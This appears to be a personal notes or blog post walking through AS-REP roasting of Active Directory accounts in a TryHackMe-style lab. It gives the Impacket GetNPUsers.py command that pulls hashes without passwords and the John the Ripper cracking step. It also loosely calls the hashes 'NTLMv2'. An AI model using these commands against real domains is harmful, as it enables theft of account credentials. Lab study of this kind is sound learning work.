---
layout: post
title: AS-REP Roasting using Impacket
description: AS-REP Roasting using Impacket
summary: AS-REP Roasting using Impacket
tags: [windows,ad,kerberos,foothold]
minute: 1
---
## Overview
* With valid usernames, attacker can intercept NTLMv2 hash and crack it to get the password because pre-authentication phase is disabled
* One way of getting valid usernames is to use [[Kerbrute]] technique
* See [[AS-REP]] for theory behind this attack

## Steps
* Add DC entry to hosts file

```
10.10.135.224 SPOOKYSEC.local
```

* Get a list of valid accounts using [[Kerbrute]]
* Put them into a txt file

```
svc-admin@spookysec.local
James@spookysec.local
robin@spookysec.local
darkstar@spookysec.local
administrator@spookysec.local
backup@spookysec.local
paradox@spookysec.local
JAMES@spookysec.local
Robin@spookysec.local
Administrator@spookysec.local
```

* Run impacket to determine what accounts are AS-REP roastable

```
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py SPOOKYSEC.local/ -usersfile users.txt -format john -outputfile out.john -no-pass
```

* Here is an example output.

![](/spindel/assets/AS-REP%20Roasting%20using%20Impacket/76430BF0-31FD-4DBF-A15F-81F0CFB51661.png)

* Crack the hashes and enjoy!

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt out.john
```

## Gotchas
I encounter an issue on THM ra box. Output tells that user doesn’t require preauth set.

```
[-] User buse@windcorp.thm doesn't have UF_DONT_REQUIRE_PREAUTH set
```

But then there was no hashes dumped. When I checked the connections in wireshark, I see that its requiring pre auth!

![](/spindel/assets/AS-REP%20Roasting%20using%20Impacket/A89116D4-A26E-46F4-9C17-44EF3E91FA4D.png)
